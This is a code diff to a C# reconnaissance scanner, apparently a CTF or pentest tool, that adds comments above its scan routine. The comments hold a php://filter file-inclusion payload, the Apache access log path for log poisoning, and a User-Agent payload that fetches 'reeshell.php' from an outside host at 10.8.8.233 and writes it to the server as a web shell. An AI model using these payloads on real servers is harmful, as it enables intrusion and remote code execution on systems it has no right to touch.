@@ -12,6 +12,13 @@ namespace Reecon
     {
         public static void Scan(string path)
         {
+            // If it must contain a word
+            // php://filter/read=convert.base64-encode/wordhere/resource=flag
+
+            // Apache2 Log Poisoning Path: /var/log/apache2/access.log
+
+            // Log poisoning file upload
+            // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
             Console.WriteLine("Scanning: " + path);
             WebClient wc = new WebClient();
             HttpStatusCode statusCode = wc.GetResponseCode(path);
